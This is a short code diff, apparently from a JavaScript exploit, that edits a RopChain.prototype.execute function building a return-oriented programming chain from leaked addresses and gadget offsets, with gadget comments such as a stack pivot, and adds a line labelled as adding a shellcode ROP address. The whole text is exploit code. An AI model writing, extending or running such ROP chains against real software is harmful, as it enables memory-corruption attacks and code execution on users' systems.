@@ -78,6 +78,9 @@ RopChain.prototype.execute = function()
   // xchg rax, rsp; dec dword ptr [rax - 0x77]; ret;
   rop_buf[2] = cbuf[0x10] - ((0x60000 * 4) * 17) + 0xdcac1
   rop_buf[3] = cbuf[0x11]
+  
+  // Add shellcode ROP address
+  rop_buf[2] += 0xdca98
 
   // pop rcx; pop rcx; ret;
   rop_buf[0] = cbuf[0x10] - ((0x60000 * 4) * 4) + 0x168f4;
